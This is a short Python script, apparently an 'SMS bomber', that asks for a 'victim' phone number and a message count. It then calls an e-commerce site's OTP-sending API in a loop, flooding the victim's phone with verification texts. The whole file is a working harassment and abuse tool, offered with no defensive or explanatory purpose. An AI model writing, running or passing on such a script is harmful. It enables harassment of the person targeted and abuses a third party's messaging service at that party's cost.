import os
from urllib import request
phone=input("Enter Your Victim Number :")
sms=int(input("Victim Attack SMS Ammount :" ))

url ="https://admin.chahidaeshop.com/api/send/otp?mobile_number="+phone+""

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+ "STF..... Sms Bombing SMS Sent ")